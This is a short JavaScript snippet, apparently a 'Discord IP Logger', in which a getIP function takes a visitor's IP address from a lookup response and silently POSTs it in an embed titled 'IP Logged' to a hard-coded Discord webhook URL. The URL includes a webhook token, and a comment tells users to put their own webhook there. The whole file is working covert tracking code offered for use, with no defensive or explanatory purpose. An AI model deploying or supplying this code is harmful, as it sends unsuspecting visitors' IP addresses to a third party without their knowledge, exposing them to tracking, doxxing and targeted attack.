function getIP(json) {
  var request = new XMLHttpRequest();
        const Hook = "https://discord.com/api/webhooks/983683842349105152/27kXk8Q2AF6x12_GtdRFErGuBIdO-KZIBl-d55ygAn71U7EIiudJ7K45VLGCBviLA-ak"; // PUT UR WEBHOOK HERE
        var request = new XMLHttpRequest();
        request.open("POST", Hook);
        request.setRequestHeader('Content-type', 'application/json');
        var params = {
            username: "Discord IP Logger",
            embeds: [
                { "color": 7506394,
                "title": "IP Logged",
                "description": json.ip
            }]
        }
        request.send(JSON.stringify(params));
    }
